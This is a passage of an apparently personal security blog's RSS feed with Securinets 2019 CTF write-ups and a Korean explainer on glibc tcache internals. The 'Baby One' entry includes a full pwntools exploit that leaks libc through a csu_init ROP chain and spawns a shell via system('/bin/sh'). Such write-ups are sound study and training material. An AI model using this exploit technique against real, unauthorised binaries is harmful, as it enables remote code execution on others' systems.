          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;easy-trade&quot;&gt;&lt;a class=&quot;markdownIt-
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="easy-trade"><a class="markdownIt-Anchor" href="#easy-trade"></a> Easy Trade</h2><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3217654/foren_trade.zip" target="_blank" rel="noopener">Pcap File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142272-63e3a700-7c81-11e9-8273-32ead6cf99dc.PNG"><center><small>[Problem]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142341-9a212680-7c81-11e9-9c5d-a6f8a16c1f54.PNG"><center><small>[Pcap File 1-1]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142298-7e1d8500-7c81-11e9-801d-726eab453f24.PNG"><center><small>[Pacp File 1-2]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142357-a86f4280-7c81-11e9-8df0-b6dbad39dfef.PNG"><center><small>[4444 Port Packet]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142358-a907d900-7c81-11e9-9155-1df8e62a1174.PNG"><center><small>[Hxd]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142360-aa390600-7c81-11e9-8a98-fb13439c5970.PNG"><center><small>[flag.zip]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142374-bc1aa900-7c81-11e9-88da-cd4407169148.PNG"><center><small>[Zip Password]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142376-bcb33f80-7c81-11e9-8ae3-0f44f710bc45.PNG"><center><small>[Base64 Decoding]</small></center> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/securinet_easy_trade/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 Baby One</title>
      <link>http://j0n9hyun.github.io/2019/03/25/securinet_baby1/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/securinet_baby1/</guid>
      <pubDate>Mon, 25 Mar 2019 05:22:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;baby-one&quot;&gt;&lt;a class=&quot;markdownIt-An
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="baby-one"><a class="markdownIt-Anchor" href="#baby-one"></a> Baby One</h2><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3217648/baby_one.zip" target="_blank" rel="noopener">Binary File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142220-3139ae80-7c81-11e9-8c61-51c92a4bdc41.PNG"><center><small>[Problem]</small></center> <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">r = process(<span class="string">'./baby1'</span>)</span><br><span class="line"><span class="comment">#r = remote('51.254.114.246', 1111)</span></span><br><span class="line">e = ELF(<span class="string">'./baby1'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x4006c3</span></span><br><span class="line">csu_init1 = <span class="number">0x4006B6</span></span><br><span class="line">csu_init2 = <span class="number">0x4006A0</span></span><br><span class="line">main_addr = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = e.got[<span class="string">'write'</span>]</span><br><span class="line">write_os = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_got = e.got[<span class="string">'read'</span>]</span><br><span class="line">system_os = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_os = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">libc_start = e.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(csu_init1)</span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(csu_init2)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leaked - write_os</span><br><span class="line">system_addr = libc_base + system_os</span><br><span class="line">binsh_addr = libc_base + binsh_os</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">r.sendlineafter(<span class="string">"\n"</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center><br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/securinet_baby1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 Welcome</title>
      <link>http://j0n9hyun.github.io/2019/03/25/securinets_welcome/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/securinets_welcome/</guid>
      <pubDate>Mon, 25 Mar 2019 05:20:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;welcome&quot;&gt;&lt;a class=&quot;markdownIt-Anc
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="welcome"><a class="markdownIt-Anchor" href="#welcome"></a> Welcome</h2><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147319-ede93b00-7c94-11e9-8228-bb3321310e74.PNG"><center><small>[Problem]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147334-fe99b100-7c94-11e9-9160-a524f73291a7.PNG"><center><small>[wrapper.c]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147335-ff324780-7c94-11e9-8fb4-b27ed36dac65.PNG"><center><small>[Get FLAG]</small></center> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/securinets_welcome/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Tcache Theory Analysis</title>
      <link>http://j0n9hyun.github.io/2019/03/19/tcache_theory/</link>
      <guid>http://j0n9hyun.github.io/2019/03/19/tcache_theory/</guid>
      <pubDate>Tue, 19 Mar 2019 01:21:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;tcache&quot;&gt;&lt;a class=&quot;markdownIt-Anch
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="tcache"><a class="markdownIt-Anchor" href="#tcache"></a> Tcache</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">char</span> tcache_shutting_down = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><center><small>[tcache_entry]</small></center><p>Ubuntu 17.04 에서 glibc 2.6 버전이 릴리즈 되었는데 <strong>tcache_entry</strong>와 <strong>tcache_perthread_struct</strong>라는 구조체가 새로 추가되었다.</p><h3 id="특징-br"><a class="markdownIt-Anchor" href="#특징-br"></a> 특징 <br></h3><ul><li>Single linked list(단일 연결 구조)를 이루고 있다.</li><li>Consolidate를 하지 않는다.</li><li>LIFO 구조를 가지고 있다.</li><li>Pointer가 오직 next chunk만 포함하고 있다.</li><li>기본적으로 Chunk Size는 24 ~ 1032 bytes 이다. (32bit : 12 ~ 516 bytes)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure><p>tcache bin 한 개당 기본적으로 7개의 Chunk를 가질 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[tcache_put]</small></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[tcache_get]</small></center><p><strong>tcache_put</strong>과 <strong>tcache_get</strong> 함수는 _int_free 와 __libc_malloc 함수가 시작할때 호출된다.<br><strong>tacace_get</strong>은 할당된 크기의 영역이 요청될때 0x408보다 작으면 호출된다.</p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037363-3eaf4580-7b68-11e9-9dec-a36a43808625.PNG"> <br></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037374-41119f80-7b68-11e9-8533-5a9f1d95e084.PNG"><center><small>[free]</small></center><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037376-41aa3600-7b68-11e9-97e6-41660941aa5c.PNG"><center><small>[한번 더 free]</small></center>entry와 count가 보이는 것을 알 수 있다. <br> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/19/tcache_theory/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
